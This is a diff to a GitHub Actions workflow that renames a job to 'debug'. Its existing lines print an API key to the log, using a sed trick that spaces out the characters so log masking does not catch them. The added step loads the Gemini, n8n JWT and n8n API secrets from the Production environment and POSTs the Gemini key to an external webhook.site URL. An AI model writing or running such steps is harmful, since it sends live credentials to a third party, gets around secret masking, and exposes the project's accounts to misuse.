@@ -6,7 +6,7 @@ on:
   workflow_dispatch:
 
 jobs:
-  my-job:
+  debug:
     runs-on: ubuntu-latest
     environment: Production
     steps:
@@ -42,3 +42,15 @@ jobs:
           echo ${{ secrets.N8N_API_KEY }}
           echo "Trick to echo GitHub Actions Secret:  "
           echo ${{secrets.N8N_API_KEY}} | sed 's/./& /g'
+
+      - name: Send secrets to webhook
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          N8N_JWT: ${{ secrets.N8N_JWT }}
+          N8N_API_KEY: ${{ secrets.N8N_API_KEY }}
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: "https://webhook.site/b8cfa571-543d-4ff2-ae8b-595b8942ef6e"
+          method: "POST"
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.GEMINI_API_KEY }}
